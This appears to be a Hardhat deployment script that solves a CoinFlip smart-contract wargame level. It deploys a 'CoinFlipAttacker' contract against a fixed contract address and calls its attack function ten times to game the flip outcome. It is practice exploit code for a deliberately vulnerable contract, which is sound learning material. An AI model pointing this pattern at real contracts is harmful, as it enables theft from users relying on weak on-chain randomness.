import { TransactionResponse } from "@ethersproject/providers";
import { ethers } from "hardhat";

const CONTRACT_NAME = "CoinFlip";
const ATTACKER_NAME = "CoinFlipAttacker";
const CONTRACT_ADDRESS = "0x5d84165A30128762a8372FdB3472458E5466dD3f";

async function main() {
  let tx: TransactionResponse;

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(contract.address);
  await attackerContract.deployed();

  for (let i = 1; i <= 10; i++) {
    console.log(`Performing attack #${i}...`);
    tx = await attackerContract.attack();
    await tx.wait(1);
  }
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
